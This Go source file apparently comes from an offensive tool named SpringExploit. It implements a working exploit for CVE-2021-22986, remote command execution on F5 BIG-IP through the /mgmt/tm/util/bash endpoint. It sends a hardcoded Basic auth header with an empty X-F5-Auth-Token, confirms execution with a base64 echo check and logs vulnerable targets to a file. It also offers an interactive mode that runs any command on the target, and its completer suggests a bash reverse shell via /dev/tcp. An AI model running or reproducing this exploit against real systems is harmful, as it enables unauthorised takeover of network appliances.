package _021

import (
	"encoding/json"
	req2 "github.com/SummerSec/SpringExploit/cmd/commons/req"
	"github.com/SummerSec/SpringExploit/cmd/commons/utils"
	"github.com/c-bata/go-prompt"
	"github.com/imroc/req/v3"
	log "github.com/sirupsen/logrus"
	"net/url"
	"strings"
)

// 参考 https://github.com/Al1ex/CVE-2021-22986/blob/main/CVE_2021_22986.pyl

type CVE202122986 struct{}

func (t CVE202122986) SendPoc(target string, hashmap map[string]interface{}) {
	log.Debug("[+] Start CVE-2021-22986")

	//reqinfo := req2.NewReqInfo()
	//reqmap := structs.Map(reqinfo)
	reqmap := req2.NewReqInfoToMap(hashmap)

	// 初始化请求
	// TODO 可以设置超时时间 重复次数 代理等 下面默认使用默认值
	reqmap["h1"] = true

	u, _ := url.Parse(target)
	path := "/mgmt/tm/util/bash"
	reqmap["url"] = u.Scheme + "://" + u.Host + path
	reqmap["method"] = "POST"

	headers := map[string]string{
		//"Host":       "localhost",
		"User-Agent": utils.GetUA(),
		//"Connection":      "keep-alive, x-f5-auTh-tOKen, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd,X-F5-New-Authtok-Reqd,X-Forwarded-Server,X-Forwarded-Host",
		//"Connection":      "keep-alive",
		"Authorization":   "Basic YWRtaW46QVNhc1M=",
		"X-F5-Auth-Token": "",
		"Content-Type":    "application/json",
	}

	reqmap["headers"] = headers

	randstr := utils.GetCode(10)
	log.Debugf("[+] randstr: %s", randstr)
	base64str := utils.EncodeBase64String(randstr)
	log.Debugf("[+] base64str: %s", base64str)

	reqmap["body"] = "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'echo " + base64str + " | base64 -d'\"}"
	//reqmap["body"] = "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
	log.Debug("[+] Send CVE-2021-22986 request")
	resp := utils.Send(reqmap)

	if t.CheckExp(resp, randstr, hashmap) {
		t.SaveResult(target, hashmap["Out"].(string))
	}

	if hashmap["Shell"].(bool) {
		log.Info("[+] Start CVE-2021-22986 shell")
		th := prompt.Input("[+] Please input command: ", completer)
		if th == "" {
			th = "whoami |base64 "
		} else {
			th = th + " |base64 "
		}
		reqmap["body"] = "{\"command\":\"run\",\"utilCmdArgs\":\"-c '" + th + "'\"}"
		resp = utils.Send(reqmap)
		txt := resp.String()

		log.Debugf("[+] resp: %s", txt)
		var txtmap map[string]interface{}
		err := json.Unmarshal([]byte(txt), &txtmap)
		if err != nil {
			log.Errorf("[-] Unmarshal error: %s", err)
			return
		}
		log.Info("命令执行结果: " + utils.DecodeBase64String(txtmap["commandResult"].(string)))
		log.Info("[+] End CVE-2021-22986 shell")
	}

}

func (CVE202122986) SaveResult(target string, file string) {
	result := target + " 存在 CVE-2021-22986 漏洞 可以使用 SpringExplit -u " + target + " -p CVE202122986 --shell 进入交互shell执行命令"
	err := utils.SaveToFile(result, file)
	log.Info(result)
	if err != nil {
		return
	}

}

func (CVE202122986) CheckExp(resp *req.Response, randstr string, hashmap map[string]interface{}) bool {
	defer func() {
		if err := recover(); err != nil {
			log.Error("[-] CheckExp error: ", err)
		}
	}()
	res := resp.String()
	if res == "" {
		return false
	}
	log.Debugf(res)
	if strings.Contains(res, randstr) {
		// 将res 转化成map
		var maps map[string]interface{}
		err := json.Unmarshal([]byte(res), &maps)
		log.Info("CVE-2021-22986 命令执行返回 commandResult: ", maps["commandResult"])
		if err != nil {
			log.Debugf("[-] json.Unmarshal error: %s", err)
			return false
		}
		return true
	}
	return false
}

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "id", Description: "you can type command {id}"},
		{Text: "bash", Description: "you can type command bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/8080 <&1'"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}
